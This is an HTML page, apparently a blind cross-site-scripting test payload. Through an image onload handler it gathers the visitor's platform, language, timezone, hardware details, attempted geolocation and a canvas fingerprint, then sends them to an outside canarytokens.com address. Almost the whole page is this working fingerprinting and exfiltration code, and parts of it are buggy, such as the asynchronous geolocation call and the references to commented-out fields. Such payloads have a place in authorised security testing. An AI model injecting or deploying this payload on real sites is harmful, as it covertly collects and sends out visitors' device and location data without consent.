<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blind XSS Test</title>
</head>
<body>
    <h1>Blind XSS Test with Canary</h1>
    <p>If you are a victim, your environment information will be sent to Canary.</p>

    <!-- XSS Trigger -->
    <img src="https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg" 
        onload="this.src='https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg&systemInfo=' + encodeURIComponent(getSystemInfo())" />
    
    <script>
        // Function to gather system and environment information
        function getSystemInfo() {
            const systemInfo = {
                //userAgent: navigator.userAgent,                // User agent string (browser, OS)
                platform: navigator.platform,                  // Operating system (Windows, Linux, macOS, etc.)
                language: navigator.language,                  // User language setting
                //screenWidth: screen.width,                     // Screen width
                //screenHeight: screen.height,                   // Screen height
                //currentURL: window.location.href,              // Current page URL
                //referrer: document.referrer,                   // Referrer URL
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,  // Timezone
                deviceMemory: navigator.deviceMemory,          // Device memory (GB)
                hardwareConcurrency: navigator.hardwareConcurrency,  // Number of CPU cores
                //plugins: navigator.plugins.length,             // Number of installed browser plugins
                mimeTypes: navigator.mimeTypes.length,         // Number of supported MIME types
                geolocation: getGeolocation(),                 // Geolocation
                canvasFingerprint: getCanvasFingerprint(),     // Canvas fingerprint
                //webGLFingerprint: getWebGLFingerprint()        // WebGL fingerprint
            };

            // Format the system info as a query string
            return 'UserAgent=' + systemInfo.userAgent + 
                   '&Platform=' + systemInfo.platform + 
                   '&Language=' + systemInfo.language + 
                   '&ScreenWidth=' + systemInfo.screenWidth + 
                   '&ScreenHeight=' + systemInfo.screenHeight + 
                   '&CurrentURL=' + systemInfo.currentURL + 
                   '&Referrer=' + systemInfo.referrer + 
                   '&Timezone=' + systemInfo.timezone + 
                   '&DeviceMemory=' + systemInfo.deviceMemory + 
                   '&HardwareConcurrency=' + systemInfo.hardwareConcurrency + 
                   '&Plugins=' + systemInfo.plugins + 
                   '&MimeTypes=' + systemInfo.mimeTypes + 
                   '&Geolocation=' + systemInfo.geolocation + 
                   '&CanvasFingerprint=' + systemInfo.canvasFingerprint; 
                   //'&WebGLFingerprint=' + systemInfo.webGLFingerprint;
        }

        // Function to get geolocation
        function getGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    return position.coords.latitude + "," + position.coords.longitude;
                });
            }
            return "Geolocation not available";
        }

        // Function to get a basic canvas fingerprint
        function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillText('fingerprint', 2, 2);
            return canvas.toDataURL();
        }

        // Function to get a basic WebGL fingerprint
        function getWebGLFingerprint() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
            return "WebGL fingerprint not available";
        }
    </script>
</body>
</html>
